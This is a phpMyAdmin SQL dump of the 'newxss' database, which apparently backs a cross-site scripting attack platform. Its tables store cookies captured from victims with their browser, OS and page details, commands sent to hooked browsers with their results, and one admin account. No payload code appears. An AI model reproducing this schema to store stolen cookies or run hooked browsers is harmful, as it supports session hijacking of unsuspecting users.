-- phpMyAdmin SQL Dump
-- version 4.1.14
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: 2014-10-28 09:22:51
-- 服务器版本： 5.6.17
-- PHP Version: 5.5.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `newxss`
--

-- --------------------------------------------------------

--
-- 表的结构 `pxss_cmd`
--

CREATE TABLE IF NOT EXISTS `pxss_cmd` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `domain` varchar(200) DEFAULT NULL,
  `ip` varchar(30) DEFAULT NULL,
  `cmd` int(2) DEFAULT NULL,
  `connect` varchar(500) DEFAULT NULL,
  `res` text,
  `datetime` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=71 ;

-- --------------------------------------------------------

--
-- 表的结构 `pxss_cookie`
--

CREATE TABLE IF NOT EXISTS `pxss_cookie` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `cookie_domain` varchar(200) DEFAULT NULL,
  `cookie_ip` varchar(30) DEFAULT NULL,
  `cookie` text,
  `title` varchar(200) DEFAULT NULL,
  `url` varchar(200) DEFAULT NULL,
  `refrerer` varchar(200) DEFAULT NULL,
  `browser` varchar(200) DEFAULT NULL,
  `language` varchar(200) DEFAULT NULL,
  `os` varchar(200) DEFAULT NULL,
  `screen` varchar(200) DEFAULT NULL,
  `getplugin` text,
  `flash` varchar(200) DEFAULT NULL,
  `cpu` varchar(50) DEFAULT NULL,
  `device` varchar(200) DEFAULT NULL,
  `datetime` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=15 ;

-- --------------------------------------------------------

--
-- 表的结构 `pxss_project`
--

CREATE TABLE IF NOT EXISTS `pxss_project` (
  `pid` int(10) NOT NULL AUTO_INCREMENT,
  `project_domain` varchar(200) DEFAULT NULL,
  `project_ip` varchar(30) DEFAULT NULL,
  `project_browser` varchar(50) DEFAULT NULL,
  `project_os` varchar(50) DEFAULT NULL,
  `project_device` varchar(50) DEFAULT NULL,
  `datetime` datetime DEFAULT NULL,
  PRIMARY KEY (`pid`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=23 ;

-- --------------------------------------------------------

--
-- 表的结构 `pxss_userinfo`
--

CREATE TABLE IF NOT EXISTS `pxss_userinfo` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `email` varchar(100) DEFAULT NULL,
  `last_login_ip` varchar(30) DEFAULT NULL,
  `last_login_time` datetime DEFAULT NULL,
  `this_login_ip` varchar(30) DEFAULT NULL,
  `this_login_time` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `pxss_userinfo`
--

INSERT INTO `pxss_userinfo` (`id`, `email`, `last_login_ip`, `last_login_time`, `this_login_ip`, `this_login_time`) VALUES
(1, 'admin@i0day.com', 'MTI3LjAuMC4x', '2014-10-28 11:40:49', 'MTI3LjAuMC4x', '2014-10-28 15:17:16');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
